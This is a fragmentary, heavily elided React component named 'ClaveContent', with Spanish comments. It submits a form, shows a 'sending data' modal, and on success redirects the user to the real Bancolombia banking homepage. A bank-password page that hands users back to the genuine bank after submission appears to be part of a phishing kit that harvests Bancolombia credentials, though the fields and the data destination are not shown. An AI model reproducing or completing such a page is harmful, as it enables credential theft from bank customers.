...
function ClaveContent() {
  ...
  const handleSubmit = async (e) => {
    ...
    setIsLoading(true); // Mostrar la modal de carga cuando comience el envío
    ...
    try {
      ...
      if (response.ok) {
        // Redirigir a la página después de enviar correctamente
        router.push('https://www.bancolombia.com/personas');
      } else {
        const errorData = await response.json();
        alert(`Error: ${errorData.message}`);
      ...
      setIsLoading(false); // Ocultar la modal de carga cuando termine
    }
  };
                  ...
                  {isLoading ? (
                    <div className="fixed inset-0 flex items-center justify-center bg-gray-500 bg-opacity-50 z-50">
                      <div className="bg-white p-8 rounded-lg shadow-lg">
                        ...
                        <p className="text-center">Enviando datos, por favor espera...</p>
                      </div>
                    </div>
                  ) : (
                    <form className="space-y-6" onSubmit={handleSubmit}>
